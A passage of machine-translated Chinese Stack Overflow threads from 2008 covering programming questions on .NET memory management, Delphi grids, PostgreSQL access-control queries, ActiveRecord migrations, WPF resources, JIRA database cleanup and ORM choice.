现在，在您的情况下，这可能无济于事。我不知道你的例子是人为的，还是真实的。如果它是真实世界的，那么行为是预期的，因为当变量超出范围时不会收集面板（也不确定它是否在桌面上）。它变得可用于收集，但这仅意味着在下一次收集过程中它将被清扫。除非你引起 GC，否则它不会被释放。

我强烈建议您查看[有关 CF 中内存管理的 MSDN 网络广播](http://www.microsoft.com/events/series/detail/webcastdetails.aspx?seriesid=86&webcastid=1032318791)。它对幕后发生的事情提供了更彻底的解释——远远超过我们在此处的答案中所能提供的。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2008-10-14T11:37:05.127

你确定你有内存泄漏？.NET Compact Framework 垃圾收集器的工作方式与完整 .NET 框架中的垃圾收集器略有不同。来自[Steven Pratschner 的博客](http://blogs.msdn.com/stevenpr/archive/2004/07/26/197254.aspx)：

> 在以下任一情况下启动收集：
> 
> *   已分配 1MB 的对象，
>     
>     
> *   一个应用程序被移到后台，
>     
>     
> *   发生分配内存失败
>     
>     
> *   应用程序调用 GC.Collect。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2009-01-07T20:59:32.813

我认为您也需要动态删除 Button Click EventHandler，正如您从这个博客中看到的那样：http: [//blogs.msdn.com/stevenpr/archive/2007/03/08/finding-managed-memory-leaks-using -the-net-cf-remote-performance-monitor.aspx](http://blogs.msdn.com/stevenpr/archive/2007/03/08/finding-managed-memory-leaks-using-the-net-cf-remote-performance-monitor.aspx)

它也是来自 Steven Pratschner。

顺便说一下，上面提到的网络广播链接在这里： [http ://msevents.microsoft.com/cui/WebCastEventDetails.aspx?culture=en-US&EventID=1032318791&CountryCode=US](http://msevents.microsoft.com/cui/WebCastEventDetails.aspx?culture=en-US&EventID=1032318791&CountryCode=US)

希望这可以帮助！

# performance - 是否有可以快速处理大型数据集的 DBGrid 组件？

> ID：200794
> 
> 赞同：3
> 
> 时间：2008-10-14T11:33:45.867
> 
> 标签：performance, delphi, dataset, dbgrid

大型数据集、数百万条记录需要特殊编程来保持 DBGrids 的速度。

我想知道是否有任何现成的 Delphi (DBGrids) 组件可以自动执行此操作？

编辑例如：某些数据库具有获取第一个 X 记录（例如 100 条记录）等功能。当我通过滚动到达底部时，我想自动获取下一个 100。相反，当我到达开头时，我想获取前 100 个。我知道我可以对此进行编程，但肯定可以将该功能传播到DBGrid 控制 DBGrid 进行缓冲的位置。它将节省相当多的编程时间 - 可以这么说，您只需设置“缓冲区大小”。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2008-10-14T15:21:54.767

您可能想看看精彩的（免费、开源、双重许可为 MPL 1.1 和 GPL，因此可用于闭源应用程序）[Virtual TreeView](http://www.soft-gems.net/index.php?option=com_content&task=view&id=12&Itemid=33)及其用户提供的后代（向下滚动页面以找到它们。）

编辑以反映问题的编辑：Virtual TreeView 不仅允许您处理数百万个节点而不将它们保存在内存中，而且这实际上是使用它的首选方式。您可以在需要时通过事件回调提供数据，并且可以告诉树缓存该数据（或不缓存）。

哦，当然它还有一个网格/报告模式，它可以用作表格（只需将 GridExtensions 属性设置为 True。）

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2008-10-14T12:14:07.923

NextGrid 是 Delphi 的轻量级、快速且美观的网格

[http://www.bergsoft.net/component/next-grid/features.htm](http://www.bergsoft.net/component/next-grid/features.htm)

> **在不降低速度的情况下处理大量细胞**
> 
> NextGrid 可以处理非常大量的单元格而不会降低速度。添加、修改和删除数据的速度不取决于单元格的数量。在 NextGrid 演示中，您可以看到 NextGrid 处理 100,000 行和 10 列 = 1,000,000 个单元格的速度有多快

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2008-10-14T14:24:34.943

我会看看[Developer Express QuantumGrid Suite](http://www.devexpress.com/Products/VCL/ExQuantumGrid/key_datacontroller.xml)。（@birger：你只是快了一点;-)）所以我不只是重复答案，而是进行一些阐述：

DevExpress Grid 使用具有多种模式的数据控制器来控制绑定到网格的数据。其中之一正是您正在寻找的：

> **网格模式**
> 
> 使用网格模式时，只会将固定数量的数据集记录加载到内存中。由于仅从数据集中检索到有限的记录集，因此在网格模式下禁用了自动排序、过滤和汇总计算（必须手动控制）。默认情况下，禁用此模式，ExpressDataController 会加载数据集中的所有记录。

它确实有一些缺点，看起来很明显：如果您手头没有所有记录，则无法进行汇总、排序或过滤。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2008-10-14T14:16:49.733

我认为[DevExpress Quantumgrid](http://www.devexpress.com/Products/VCL/ExQuantumGrid/)很好地支持了这一点。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2008-10-14T12:24:58.290

抱歉，我刚看到你对 Neftalí 的评论

如果您每次要带 100 条记录，然后获取下 100 条，这项工作与数据库访问组件有关，请查看**devart**组件，它们提供对最常用数据库的直接访问组件，并且它们具有您所询问的功能和更多：

[http://www.devart.com/products-vcl.html](http://www.devart.com/products-vcl.html)

# sql - 如何通过 SQL 表进行访问控制？

> ID：200810
> 
> 赞同：4
> 
> 时间：2008-10-14T11:39:51.783
> 
> 标签：sql, postgresql, access-control

我正在尝试创建一个访问控制系统。

这是我试图控制访问权限的表的简化示例：

```
things table:
id   group_id   name
1    1          thing 1
2    1          thing 2
3    1          thing 3
4    1          thing 4
5    2          thing 5 
```

访问控制表如下所示：

```
access table:
user_id  type   object_id  access
1        group  1          50
1        thing  1          10
1        thing  2          100 
```

可以通过直接指定“事物”的 id 来授予访问权限，也可以通过指定组 id 来授予整个事物组的访问权限。在上面的示例中，用户 1 已被授予对组 1 的访问级别 50，除非有任何其他规则授予对单个事物的更具体的访问权限，否则该级别应适用。

我需要一个查询，它返回一个事物列表（只有 id 可以）以及特定用户的访问级别。因此，使用上面的示例，我希望用户 id 1 是这样的：

```
desired result:
thing_id   access
1          10
2          100
3          50   (things 3 and 4 have no specific access rule,
4          50   so this '50' is from the group rule)
5               (thing 5 has no rules at all, so although I 
                still want it in the output, there's no access
        level for it) 
```

我能想到的最接近的是：

```
SELECT * 
FROM things 
LEFT JOIN access ON 
    user_id = 1
    AND (
        (access.type = 'group' AND access.object_id = things.group_id)
        OR (access.type = 'thing' AND access.object_id = things.id)
    ) 
```

但这会返回多行，而我只希望“事物”表中的每一行都有一个。我不确定如何为每个“事物”减少一行，或者如何将“事物”规则优先于“组”规则。

如果有帮助，我使用的数据库是 PostgreSQL。

如果我错过了任何信息，请随时发表评论。

提前致谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2008-10-14T11:50:57.110

我昨晚刚读了一篇关于这个的论文。它对如何做到这一点有一些想法。如果您无法使用标题上的链接，请尝试使用 Google Scholar on [Limiting Disclosure in Hippocratic Databases。](http://portal.acm.org/citation.cfm?id=1316701)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2008-10-14T11:56:43.823

我不知道 Postgres SQL 方言，但可能类似于：

```
select thing.*, coalesce ( ( select access
                             from   access
                             where  userid = 1
                             and    type = 'thing'
                             and    object_id = thing.id
                           ),
                           ( select access
                             from   access
                             where  userid = 1
                             and    type = 'group'
                             and    object_id = thing.group_id
                           )
                         )
from things 
```

顺便说一句，我不喜欢这个设计。我希望将访问表分成两个：

```
thing_access (user_id, thing_id, access)
group_access (user_id, group_id, access) 
```

然后我的查询变为：

```
select thing.*, coalesce ( ( select access
                             from   thing_access
                             where  userid = 1
                             and    thing_id = thing.id
                           ),
                           ( select access
                             from   group_access
                             where  userid = 1
                             and    group_id = thing.group_id
                           )
                         )
from things 
```

我更喜欢这个，因为现在可以在访问表中使用外键。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2008-10-14T11:59:56.563

虽然有几个很好的答案，但最有效的可能是这样的：

```
SELECT things.id, things.group_id, things.name, max(access) 
FROM things 
LEFT JOIN access ON 
        user_id = 1 
        AND (
                (access.type = 'group' AND access.object_id = things.group_id)
                OR (access.type = 'thing' AND access.object_id = things.id)
        )
group by things.id, things.group_id, things.name 
```

它只是使用添加到您查询中的摘要来获取您要查找的内容。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2008-10-14T12:36:50.200

托尼：

不错的解决方案，我喜欢它，似乎有效。这是您在稍作调整后的查询：

```
SELECT 
    things.*, 
    coalesce ( 
        (   SELECT access 
            FROM access 
            WHERE user_id = 1 
                AND type = 'thing' 
                AND object_id = things.id
        ), 
        (   SELECT access 
            FROM access 
            WHERE user_id = 1 
                AND type = 'group' 
                AND object_id = things.group_id 
        ) 
    ) AS access
    FROM things; 
```

结果看起来是正确的：

```
 id | group_id |  name   | access 
----+----------+---------+--------
  1 |        1 | thing 1 |     10
  2 |        1 | thing 2 |    100
  3 |        1 | thing 3 |     50
  4 |        1 | thing 4 |     50
  5 |        2 | thing 5 | 
```

我*完全*认为它不是一个理想的模式。但是，我在某种程度上坚持下去。

* * *

约瑟夫：

您的解决方案与我正在玩的东西非常相似，我的直觉（例如它们）告诉我应该可以这样做。不幸的是，它不会产生完全正确的结果：

```
 id | group_id |  name   | max 
----+----------+---------+-----
  1 |        1 | thing 1 |  50
  2 |        1 | thing 2 | 100
  3 |        1 | thing 3 |  50
  4 |        1 | thing 4 |  50
  5 |        2 | thing 5 | 
```

“事物 1”的访问级别采用了更高的“组”访问值，而不是更具体的“事物”访问值 10，这就是我所追求的。我认为没有办法在`GROUP BY`.

# ruby-on-rails - 如何强制 ActiveRecord 重新加载一个类？

> ID：200813
> 
> 赞同：61
> 
> 时间：2008-10-14T11:40:13.093
> 
> 标签：ruby-on-rails, ruby, activerecord, migration

我正在创建一堆迁移，其中一些是标准的“创建表”或“修改表”迁移，其中一些是修改数据。我正在使用我的实际 ActiveRecord 模型来修改数据，例如：

```
Blog.all.each do |blog|
  update_some_blog_attributes_to_match_new_schema
end 
```

问题是如果我加载博客类，然后修改表，然后再次使用博客类，模型有旧的表定义，无法保存到新表。有没有办法重新加载类及其属性定义，以便我可以重用它们？

* * *

## 回答 #1

> 赞同：138
> 
> 时间：2008-10-14T11:41:02.293

答案是肯定的！

```
Blog.reset_column_information 
```

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2008-10-14T16:30:26.580

我总是在迁移中使用新模型

```
 MyBlog < ActiveRecord::Base
      set_table_name 'blogs'
    end

    def self.up
      MyBlog.all.each do |blog|
        update_some_blog_attributes_to_match_new_schema
      end
    end 
```

但是`Blog.reset_column_information`比较方便。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2008-10-14T12:09:22.877

创建新实例：

* * *

```
Old_blogs = Blog.all 
```

> # 在此处更改/修改数据库表

```
New_blogs = Blog.all # this should be reloaded or you could use the .reload on this 
```

> # 更改信息，将旧的加载到新的

# 前任。

```
Old_blogs.each do |blog|
  New_blogs.find(blog.id).title = blog.title
end 
```

# javascript - 如何在 Firefox 中跟踪和调试 JavaScript 内存泄漏？

> ID：200822
> 
> 赞同：16
> 
> 时间：2008-10-14T11:46:24.717
> 
> 标签：javascript, memory-leaks, mootools

我一直在尝试跟踪这个一个月，但没有任何成功。我在汽车广告网站上有这段代码，考虑到汽车有多张图片，它基本上允许缩略图在搜索结果中旋转。您可以在以下位置看到它的实际效果：

> [`http://www.abcavendre.com/4506691919/`](http://www.abcavendre.com/4506691919/ "发明家")

它建立在[mootools 1.2](http://www.mootools.net/ "穆工具")框架之上。问题是这个脚本，在 Firefox 3 下，当页面充满那些旋转图片时，会消耗相当多的内存超时，例如这个库存页面：

> [`http://www.abcavendre.com/Vitrine/Israel_Huttman/`](http://www.abcavendre.com/Vitrine/Israel_Huttman/ "发明家")

您可以在此处查看相关脚本的来源：

> [`http://www.abcavendre.com/scripts/showcase_small.js`](http://www.abcavendre.com/scripts/showcase_small.js "Javascript 源代码")

关于导致内存泄漏的任何想法？奇怪的是这段代码在 IE7 下运行正常。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2008-10-14T12:28:05.053

在 Firefox 中跟踪内存泄漏的一种方法是使用[泄漏监视器插件](https://addons.mozilla.org/de/firefox/addon/2490)。它显示了 javascript（包括扩展脚本）的内存泄漏。

请提醒，插件有时会显示泄漏的对象，这些对象稍后会被垃圾收集清理掉。如果是这种情况，插件将启动一个新窗口，向您显示新状态。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2008-10-14T12:01:04.733

尝试在初始化函数的末尾清空元素变量数组

```
 ...

    if (ads.length > 0)
        {
        this.imagesFx = new Fx.Elements(elements,
            {
            wait: false,
            duration: 1000
            });
        this.moveNext.periodical(2500, this);
        }

    elements = null; //Add THIS!
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2008-10-17T10:48:11.993

更新到 MooTools 1.2.1，我们改进了垃圾收集和泄漏处理。

# c# - 如何动态设置哪些属性绑定到 DataGridView？

> ID：200830
> 
> 赞同：4
> 
> 时间：2008-10-14T11:51:05.083
> 
> 标签：c#, .net, winforms, data-binding, datagridview

我的 DataGridView 需要支持多种类型，这些类型可能具有任意数量的公共属性，而不是我想要显示的所有属性。

任何人都可以建议一种在将类绑定到数据源时动态自定义 DataGridView 列的方法吗？例如，是否有一个属性可以告诉控件是否将属性用作列？

建议表示赞赏。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2008-10-14T11:55:20.893

默认情况下（启用自动列生成），它将简单地（通过 ComponentModel）获取`[Browsable(true)]`属性，（或那些省略此属性的）。

如果这是此数据的*唯一*绑定使用，您可以添加`[Browsable(false)]`到您不想显示的属性。请注意，这也将阻止对这些属性进行常规数据绑定（即`TextBox`、`PropertyGrid`等）。

实际上，我希望创建自己的属性会更好，并使用它来查找要通过反射显示的属性（并自己构建列）。

# java - 如何在 Java 中解析基本查询（à la Google Data）？

> ID：200836
> 
> 赞同：0
> 
> 时间：2008-10-14T11:54:04.750
> 
> 标签：java, parsing, gdata-api

我有一个系统，可以在其中查询 REST / Atom 服务器的文档。查询受 GData 启发，如下所示：

```
http://server/base/feeds/documents?bq=[type in {'news'}] 
```

我必须解析“bq”参数才能知道将返回哪种类型的文档而无需实际执行查询。例如，

```
bq=[type = 'news']                      ->  return ["news"]
bq=[type in {'news'}]                   ->  return ["news"]
bq=[type in {'news', 'article'}]        ->  return ["news", "article"]
bq=[type = 'news']|[type = 'article']   ->  return ["news", "article"]
bq=[type = 'news']|[title = 'My Title'] ->  return ["news"] 
```

基本上，查询语言是可以与 OR（“|”）或 AND（无分隔符）组合的谓词列表。每个谓词都是对一个字段的约束。约束可以是 =、<、>、<=、>=、in 等……在任何有意义的地方都可以有空格。

我在 Regexp、StringTokenizer、StreamTokenizer 等之间有点迷失了……我被 Java 1.4 困住了，所以没有 Parser……

谁能指出我正确的方向？

谢谢 ！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2008-10-14T13:20:08.833

正确的方法是使用[Antlr](http://www.antlr.org/)、[JFlex](http://jflex.de/)或[JavaCC](https://javacc.dev.java.net/)等解析器生成器。

一种快速而肮脏的方法是：

```
String[] disjunctedPredicateGroups = query.split("\|");
List<String[]> normalizedPredicates = ArrayList<String[]>;
for (String conjunction : disjunctedPredicateGroups ) {
   normalizedPredicates.add(conjunction.split("\[|\]"));
}
// process each predicate 
```

# sql - 使用 SQL 清理 JIRA 数据库

> ID：200837
> 
> 赞同：1
> 
> 时间：2008-10-14T11:54:07.230
> 
> 标签：sql, jira

有没有人幸运地从 jira 数据库中删除了大量问题而不是使用前端？使用 bulktools 删除 60000 个问题实际上并不可行。

上次我尝试它时，jira 因为它自己的索引方式而发疯了。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2008-10-14T15:12:44.303

备份到 xml、编辑 xml 并重新导入怎么样？

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2008-10-14T15:59:13.053

我们很勇敢，对 jiraissues 表进行了截断，然后在前端使用了重建索引功能。看起来它正在工作！

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2014-05-05T16:48:40.533

这是旧的，但我看到这个问题最近才被编辑，所以插话：

直接写入 JIRA 数据库是有问题的。2008 年 10 月 14 日答案中建议的重新索引功能只是重建 Lucene 索引，因此不太可能清理现代 JIRA 实例上需要从数据库中清理的所有内容。在我的脑海中，这可能会在下表中留下数据，其中包括：

*   自定义字段数据（customfieldvalue 表）
*   问题链接（问题链接表）
*   版本和组件（节点关联表，其中也包含其他内容，所以要小心！）
*   远程问题链接或 wiki 提及（远程链接表）

如果已经在生产环境中进行了这样的手动删除，那么最好运行数据库完整性检查器 (YOURJIRAURL/secure/admin/IntegrityChecker!default.jspa) 以确保没有严重损坏。

快进到 2014 年，最好的解决方案是编写一个使用[REST API](https://docs.atlassian.com/jira/REST/6.2.4/#d2e3848)删除所有必需问题的快速 shell 脚本。（[JIRA CLI](https://bobswift.atlassian.net/wiki/display/JCLI/JIRA+Command+Line+Interface)插件通常也是自动化某些类型任务的好选择，但据我所知，它目前不支持删除问题，所以 REST API 是你最好的选择。）

# .net - WPF中的StaticResource和DynamicResource有什么区别？

> ID：200839
> 
> 赞同：506
> 
> 时间：2008-10-14T11:54:57.853
> 
> 标签：.net, wpf, xaml, resources

在 WPF 中使用画笔、模板和样式等资源时，可以将它们指定为 StaticResources

```
<Rectangle Fill="{StaticResource MyBrush}" /> 
```

或作为 DynamicResource

```
<ItemsControl ItemTemplate="{DynamicResource MyItemTemplate}"  /> 
```

大多数时候（总是？），只有一个有效，另一个会在运行时抛出异常。但我想知道为什么：

*   主要区别是什么。像内存或性能影响
*   WPF 中是否有“画笔始终是静态的”和“模板始终是动态的”等规则？

我**认为**静态与动态之间的选择并不像看起来那样随意......但我看不到这种模式。

* * *

## 回答 #1

> 赞同：499
> 
> 时间：2008-10-14T12:04:29.097

在应用程序实际运行之前加载 XAML 期间，将解析[StaticResource并将其分配给属性。](https://msdn.microsoft.com/en-gb/library/cc189045(v=vs.95).aspx)它只会被分配一次，并且对资源字典的任何更改都会被忽略。

[DynamicResource](https://msdn.microsoft.com/en-us/library/vstudio/ms748942(v=vs.100).aspx)在加载期间将一个Expression 对象分配给该属性，但直到运行时要求该 Expression 对象提供值时才实际查找该资源。这会延迟查找资源，直到在运行时需要它。一个很好的例子是对稍后在 XAML 中定义的资源的前向引用。另一个例子是直到运行时才存在的资源。如果源资源字典更改，它将更新目标。

* * *

## 回答 #2

> 赞同：129
> 
> 时间：2010-12-30T03:26:34.867

我也对他们感到困惑。请参阅下面的示例：

```
<Window x:Class="WpfApplicationWPF.CommandsWindow"
        xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
        xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
        Title="CommandsWindow" Height="300" Width="300">

    <StackPanel>
        <Button Name="ButtonNew" 
                Click="ButtonNew_Click" 
                Background="{DynamicResource PinkBrush}">NEW</Button>
        <Image Name="ImageNew" 
               Source="pack://application:,,,/images/winter.jpg"></Image>
    </StackPanel>

    <Window.Background>
        <DynamicResource ResourceKey="PinkBrush"></DynamicResource>
    </Window.Background>

</Window> 
```

这里我为按钮和窗口使用了动态资源，并没有在任何地方声明它。运行时，将检查层次结构的ResourceDictionary。由于我没有定义它，我猜会使用默认值。

如果我将下面的代码添加到 Button 的单击事件，由于它们使用 DynamicResource，因此背景将相应更新。

```
private void ButtonNew_Click(object sender, RoutedEventArgs e)
{
    this.Resources.Add(  "PinkBrush"
                         ,new SolidColorBrush(SystemColors.DesktopColor)
                       );
} 
```

如果他们使用了 StaticResource：

*   资源必须在 XAML 中声明
*   这也是“在”他们被使用之前。

希望我消除了一些困惑。

* * *

## 回答 #3

> 赞同：36
> 
> 时间：2010-12-26T02:23:33.240

StaticResource 将在对象构造时解决。
每次控件需要资源时，都会评估和解析 DynamicResource。

* * *

## 回答 #4

> 赞同：30
> 
> 时间：2015-04-27T18:10:49.107

1.  StaticResource 使用**第一个**值。DynamicResource 使用**最后一个**值。
2.  DynamicResource 可用于嵌套样式，StaticResource 不能。

假设你有这个嵌套的 Style 字典。LightGreen 位于根级别，而 Pink 嵌套在 Grid 中。

```
<ResourceDictionary xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
                    xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml">
    <Style TargetType="{x:Type Grid}">
        <Style.Resources>
            <Style TargetType="{x:Type Button}" x:Key="ConflictButton">
                <Setter Property="Background" Value="Pink"/>
            </Style>
        </Style.Resources>
    </Style>
    <Style TargetType="{x:Type Button}" x:Key="ConflictButton">
        <Setter Property="Background" Value="LightGreen"/>
    </Style>
</ResourceDictionary> 
```

鉴于：

```
<Window x:Class="WpfStyleDemo.ConflictingStyleWindow"
        xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
        xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
        Title="ConflictingStyleWindow" Height="100" Width="100">
    <Window.Resources>
        <ResourceDictionary>
            <ResourceDictionary.MergedDictionaries>
                <ResourceDictionary Source="Styles/ConflictingStyle.xaml" />
            </ResourceDictionary.MergedDictionaries>
        </ResourceDictionary>
    </Window.Resources>
    <Grid>
        <Button Style="{DynamicResource ConflictButton}" Content="Test"/>
    </Grid>
</Window> 
```

StaticResource 会将按钮呈现为 LightGreen，这是它在样式中找到的第一个值。DynamicResource 将在呈现网格时将 LightGreen 按钮覆盖为粉红色。

![静态资源](https://i.stack.imgur.com/dYc0V.png) 静态资源

![动态资源](https://i.stack.imgur.com/MLGoJ.png) 动态资源

请记住，VS Designer 将 DynamicResource 视为 StaticResource。它将获得第一个值。在这种情况下，VS Designer 会将按钮呈现为 LightGreen，尽管它实际上最终呈现为 Pink。

当根级样式 (LightGreen) 被移除时，StaticResource 会抛出错误。

* * *

## 回答 #5

> 赞同：18
> 
> 时间：2013-03-30T01:58:28.770

**主要区别是什么。像内存或性能影响**

当底层对象发生变化时，静态资源和动态资源之间的区别就出现了。如果您在 Resources 集合中定义的 Brush 在代码中被访问并设置为不同的对象实例，则 Rectangle 将不会检测到此更改。

静态资源通过引用元素检索一次并在资源的生命周期内使用。然而，DynamicResources 每次使用时都会检索。

动态资源的缺点是它们往往会降低应用程序性能。

**WPF 中是否有“画笔始终是静态的”和“模板始终是动态的”等规则？**

最佳实践是使用静态资源，除非有特定原因，例如您想动态更改代码中的资源。您希望使用动态资源的另一个示例包括使用 SystemBrushes、SystenFonts 和系统参数时。

* * *

## 回答 #6

> 赞同：10
> 
> 时间：2014-01-24T10:01:15.453

发现所有答案都很有用，只是想再添加一个用例。

在复合 WPF 方案中，您的用户控件可以通过将资源称为 DynamicResource 来使用在任何其他父窗口/控件（将承载此用户控件）中定义的资源。

正如其他人所提到的，静态资源将在编译时查找。用户控件不能引用托管/父控件中定义的那些资源。不过，在这种情况下可以使用 DynamicResource。

* * *

## 回答 #7

> 赞同：4
> 
> 时间：2014-09-18T12:34:49.063

动态资源的重要好处

如果应用程序启动时间非常长，则必须使用动态资源，因为静态资源总是在创建窗口或应用程序时加载，而动态资源在首次使用时加载。

但是，除非您的资源非常庞大和复杂，否则您不会看到任何好处。

* * *

## 回答 #8

> 赞同：4
> 
> 时间：2016-09-01T04:46:52.823

**动态资源只能在设置的属性位于从依赖对象派生的对象上或可冻结的对象上使用，因为静态资源可以在任何地方使用。您可以使用静态资源抽象出整个控制。**

**在以下情况下使用静态资源：**

1.  不需要在运行时更改反应资源时。
2.  如果您需要具有大量资源的良好性能。
3.  在同一字典中引用资源时。

**动态资源：**

1.  直到运行时才知道属性或样式设置器主题的值
    *   这包括系统、应用程序、基于主题的设置
    *   这也包括前向引用。
2.  引用在页面、窗口、用户控件加载时可能无法加载的大型资源。
3.  在自定义控件中引用主题样式。

# rss - Cooliris 从谷歌文档中获取：

> ID：200842
> 
> 赞同：0
> 
> 时间：2008-10-14T11:55:08.287
> 
> 标签：rss, google-docs, cooliris

我们正在为一个班级创建一个交互设计模式网站。我们一直在使用谷歌文档在课堂上创建模式列表，并与老师分享以进行评估。

所以环境是这样的：

*   我们已经能够从我们想要显示的每个演示文稿中获取单个图像，例如：[http ://docs.google.com/file?id=dd2dpzk6_164zcwm3jgv_b](http://docs.google.com/file?id=dd2dpzk6_164zcwm3jgv_b)
*   我们为cooliris创建了一个RSS提要打开：（来自它的小例子）：

    <.项目>

    ```
    <.title>e7_pattern_7.78<./title>

    <.link>http://docs.google.com/file?id=dd2dpzk6_164zcwm3jgv_b<./link>

    <.guid>dd2dpzk6_164zcwm3jgv_b<./guid>

    <.media:thumbnail url="http://docs.google.com/file?id=dd2dpzk6_164zcwm3jgv_b" />

    <.media:content url="http://docs.google.com/file?id=dd2dpzk6_164zcwm3jgv_b" type="image/png" /> 
    ```

    <./项目>

抱歉，标签中间的点仅用于stackoverflow而不是对其进行过滤。

所以问题如下，RSS工作正常，因为cooliris打开了所有图像的所有视口。但是所有图片的缩略图和内容都保持黑色。

如果您尝试通过上面的 url 打开它们，您可以下载它们，type="image/png" 如果应该适用于 piclens 打开它。

任何人都知道为什么我们不能通过 cooliris 访问谷歌文档中的图像？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2008-10-14T12:31:14.953

服务器需要一个crossdomain.xml 来允许cooliris。所以我们不能直接从谷歌上做，但我们只需下载它放在另一台服务器上。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2008-12-07T09:30:33.673

尝试将 type="image/png" 也放入 media:thumbnail 标签中。另外，将您的提要通过 RSS 验证器，以查看它是否签出。

# linq - Persistence framework?

> ID：200847
> 
> 赞同：1
> 
> 时间：2008-10-14T11:55:47.007
> 
> 标签：linq, nhibernate, ado.net, linq-to-entities, persistence

I'm trying to decide on the best strategy for accessing the database. I understand that this is a generic question and there's no a single good answer, but I will provide some guidelines on what I'm looking for. The last few years we have been using our own persistence framework, that although limited has served as well. However it needs some major improvements and I'm wondering if I should go that way or use one of the existing frameworks. The criteria that I'm looking for, in order of importance are:

1.  Client code should work with clean objects, width no database knowledge. When using our custom framework the client code looks like:

    SessionManager session = new SessionManager(); Order order = session.CreateEntity(); order.Date = DateTime.Now; // Set other properties OrderDetail detail = order.AddOrderDetail(); detail.Product = product; // Other properties

    // Commit all changes now session.Commit();

2.  Should as simple as possible and not "too flexible". We need a single way to do most things.

3.  Should have good support for object-oriented programming. Should handle one-to-many and many-to-many relations, should handle inheritance, support for lazy loading.
4.  Configuration is preferred to be XML based.

With my current knowledge I see these options:

1.  Improve our current framework - Problem is that it needs a good deal of effort.
2.  ADO.NET Entity Framework - Don't have a good understanding, but seems too complicated and has bad reviews.
3.  LINQ to SQL - Does not have good handling of object-oriented practices.
4.  nHibernate - Seems a good option, but some users report too many archaic errors.
5.  SubSonic - From a short introduction, it seems too flexible. I do not want that.

What will you suggest?

**EDIT:**

Thank you Craig for the elaborate answer. I think it will help more if I give more details about our custom framework. I'm looking for something similar. This is how our custom framework works:

1.  It is based on DataSets, so the first thing you do is configure the DataSets and write queries you need there.
2.  You create a XML configuration file that specifies how DataSet tables map to objects and also specify associations between them (support for all types of associations). 3.A custom tool parse the XML configuration and generate the necessary code. 4.Generated classes inherit from a common base class.

To be compatible with our framework the database must meet these criteria:

1.  Each table should have a single column as primary key.
2.  All tables must have a primary key of the same data type generated on the client.
3.  To handle inheritance only single table inheritance is supported. Also the XML file, almost always offers a single way to achieve something.

What we want to support now is:

*   Remove the dependency from DataSets. SQL code should be generated automatically but the framework should NOT generate the schema. I want to manually control the DB schema.
*   More robust support for inheritance hierarchies.
*   Optional integration with LINQ.

I hope it is clearer now what I'm looking for.

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2008-10-14T14:31:24.290

> Improve our current framework - Problem is that it needs a good deal of effort

In your question, you have not given a reason why you should rewrite functionality which is available from so many other places. I would suggest that reinventing an ORM is not a good use of your time, unless you have unique needs for the ORM which you have not specified in your question.

> ADO.NET Entity Framework

We are using the Entity Framework in the real world, production software. Complicated? No more so than most other ORMs as far as I can tell, *which is to say, "fairly complicated."* However, it is relatively new, and as such there is less community experience and documentation than something like NHibernate. So the lack of documentation may well make it seem more complicated.

The Entity Framework and NHibernate take distinctly different approaches to the problem of bridging the object-relational divide. I've written about that in a good bit more detail in [this blog post](http://blogs.teamb.com/craigstuntz/2008/07/17/37825 "The ADO.NET Entity Framework vs. NHibernate and Other ORMs"). You should consider which approach makes the most sense to you.

There has been a great deal of commentary about the Entity Framework, both positive and negative. Some of it is well-founded, and some of the seems to come from people who are pushing other solutions. The well-founded criticisms include

*   Lack of POCO support. This is not an issue for some applications, it is an issue for others. POCO support will likely be added in a future release, but today, the best the Entity Framework can offer is IPOCO.
*   A monolithic mapping file. This hasn't been a big issue for us, since our metadata is not in constant flux.

However, some of the criticisms seem to me to miss the forest for the trees. That is, they talk about features other than the essential functionality of object relational mapping, which the Entity Framework has proven to us to do very well.

> LINQ to SQL - Does not have good handling of object-oriented practices

I agree. I also don't like the SQL Server focus.

> nHibernate - Seems a good option, but some users report too many archaic errors.

Well, the nice thing about NHibernate is that there is a very vibrant community around it, and when you do encounter those esoteric errors (and believe me, the Entity Framework also has its share of esoteric errors; it seems to come with the territory) you can often find solutions very easily. That said, I don't have a lot of personal experience with NHibernate beyond the evaluation we did which led to us choosing the Entity Framework, so I'm going to let other people with more direct experience comment on this.

> SubSonic - From a short introduction, it seems too flexible. I do not want that.

SubSonic is, of course, much more than just an ORM, and SubSonic users have the option of choosing a different ORM implementation instead of using SubSonic's ActiveRecord. As a web application framework, I would consider it. However, its ORM feature is not its raison d'être, and I think it's reasonable to suspect that the ORM portion of SubSonic will get less attention than the dedicated ORM frameworks do.

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2008-10-14T12:04:54.320

[LLBLGen](http://www.llblgen.com) make very good ORM tool which will do almost all of what you need.

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2008-10-14T12:12:10.390

[iBATIS](http://ibatis.apache.org/) is my favourite because you get a better grain of control over the SQL

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2008-10-14T13:08:52.243

